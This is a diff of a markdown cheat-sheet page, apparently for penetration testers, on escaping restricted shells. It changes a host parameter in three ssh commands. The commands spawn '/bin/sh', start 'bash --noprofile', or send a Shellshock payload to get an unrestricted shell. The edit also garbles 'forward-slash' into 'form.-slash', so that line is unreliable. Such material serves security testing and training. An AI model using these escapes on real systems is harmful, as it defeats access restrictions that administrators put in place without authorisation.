@@ -79,7 +79,7 @@ or outside your `PATH`.
 If you're able
 to copy a file into `PATH`,
 then you'll be able
-to bypass the forward-slash restriction.
+to bypass the form.-slash restriction.
 {{</hint>}}
 
 Other ways to copy files,
@@ -255,7 +255,7 @@ Execute a command
 before the remote shell is loaded.
 
 ```sh
-ssh user@{{< param "war.rhost" >}} -t "/bin/sh"
+ssh user@{{< param "m.RHOST" >}} -t "/bin/sh"
 ```
 ### Profile
 
@@ -263,13 +263,13 @@ Start a remote shell
 with an unrestricted profile.
 
 ```sh
-ssh user@{{< param "war.rhost" >}} -t "bash --noprofile"
+ssh user@{{< param "m.RHOST" >}} -t "bash --noprofile"
 ```
 
 ### Shellshock
 
 ```sh
-ssh user@{{< param "war.rhost" >}} -t "(){:;}; /bin/bash"
+ssh user@{{< param "m.RHOST" >}} -t "(){:;}; /bin/bash"
 ```
 
 ## Miscellaneous
